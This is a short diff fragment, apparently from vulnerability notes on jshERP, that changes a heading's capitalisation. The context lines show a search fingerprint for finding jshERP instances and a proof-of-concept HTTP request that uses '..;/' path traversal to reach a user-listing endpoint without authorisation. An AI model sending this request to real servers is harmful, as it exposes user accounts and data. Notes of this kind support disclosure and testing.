@@ -8,7 +8,7 @@
 web.icon=="f6efcd53ba2b07d67ab993073c238a11"
 ```
 
-## poc
+## POC
 
 ```java
 GET /jshERP-boot/platformConfig/getPlatform/..;/..;/..;/jshERP-boot/user/getAllList HTTP/1.1
